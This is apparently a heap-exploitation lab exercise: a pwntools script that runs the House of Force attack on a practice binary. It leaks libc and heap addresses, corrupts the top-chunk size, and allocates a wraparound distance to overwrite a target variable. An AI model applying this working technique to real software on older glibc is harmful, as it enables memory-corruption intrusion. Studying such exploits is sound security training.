#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_force")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Select the "malloc" option, send size & data.
def malloc(size, data):
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil("heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil("> ")
io.timeout = 0.1

# overwriting the size of the top-chunk (since in glibc<=2.28 there is no integrity check for it)
malloc(24, b"A"*24 + p64(0xffffffffffffffff))

distance = delta(
    heap + 0x20, # heap start + requested chunk size (min-size is 0x20, regardless of the fact that we requested less than that)
    elf.sym.target - 0x20 # target resides in heap memory, we want to point to the start of it 
)

# Allocating the distance
malloc(distance, b"\x90")

# Overwriting the target
malloc(24, b"Wow much win")

io.sendline(b"2")
io.recvuntil("target: ")
log.info(f"target value: {io.recvline()}")
io.sendline(b"3")
io.recvall()
